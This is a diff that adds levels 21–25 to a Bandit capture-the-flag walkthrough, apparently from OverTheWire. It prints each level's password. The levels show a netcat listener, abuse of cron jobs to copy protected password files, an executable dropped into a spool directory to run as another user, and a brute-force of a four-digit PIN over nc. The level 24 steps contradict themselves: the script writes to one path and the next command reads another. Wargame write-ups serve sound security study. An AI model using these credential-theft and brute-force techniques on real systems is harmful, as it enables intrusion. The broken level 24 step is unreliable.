@@ -205,3 +205,91 @@ IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 $ ./bandit20-do cat /etc/bandit_pass/bandit20
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ```
+
+## Level 21
+```
+$ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 9447
+^Z
+$ ./suconnect 9447
+^Z
+$ fg 1
+echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 9447
+^Z
+$ fg 2
+./suconnect 9447
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+$ fg 1
+echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 9447
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+```
+
+## Level 22
+```
+$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+## Level 23
+```
+$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+$ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+## Level 24
+```
+$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+	if [ "$i" != "." -a "$i" != ".." ];
+	then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+	fi
+done
+$ cat > /var/spool/solve.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/sairuiu/pass
+$ chmod +x /var/spool/solve.sh
+$ cat /tmp/9447/pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+## Level 25
+```
+$ for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> dict; done
+$ cat dict | nc localhost 30002
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
